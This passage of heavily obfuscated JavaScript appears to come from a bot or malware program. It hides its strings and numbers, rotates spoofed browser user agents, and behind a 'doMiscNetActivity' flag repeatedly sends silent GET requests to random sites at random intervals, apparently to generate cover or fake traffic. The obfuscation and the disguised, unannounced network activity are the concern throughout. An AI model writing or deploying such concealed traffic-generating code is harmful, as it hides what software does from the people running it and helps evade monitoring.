      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x3 * 0xac7 + -0x4 * -0x71 + -0x2219; k < -0x1 * -0xf3f + 0x1 * -0x1ea6 + 0xf6b; k++)
    setTimeout(f, (-0x194 * 0x73 + 0x2 * -0x744d + 0x1 * 0x28876) * k * getRandomInt(-0x4 * 0x455 + 0x2383 + -0x122e, 0x43 * 0x22 + -0x2 * 0xc43 + 0xfa3));
  setInterval(() => {
    f();
    for (let l = 0x21fe + -0xd4c + -0x14b2; l < 0x7 * -0x87 + 0x193 * 0x17 + -0xa0 * 0x34; l++)
      setTimeout(f, (-0x1 * -0xefc9 + -0x7ed * -0x23 + -0x11ad0) * l * getRandomInt(-0xbe7 + -0x24df + 0x30c7, -0x35a + 0x31 * -0x19 + 0x826));
  }, -0x1edfde + 0x1e7 * 0x35cd + -0x1 * 0x108a9d);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x18b * -0x5 + -0x35db * -0x1 + -0x2 * 0x966) * getRandomInt(0xda2 + -0x262a * -0x1 + -0x33cb, -0x49 * 0x4 + 0x27d + -0x154));
}, -0x1 * -0x253e + 0x1e3b * -0x1 + -0x69f);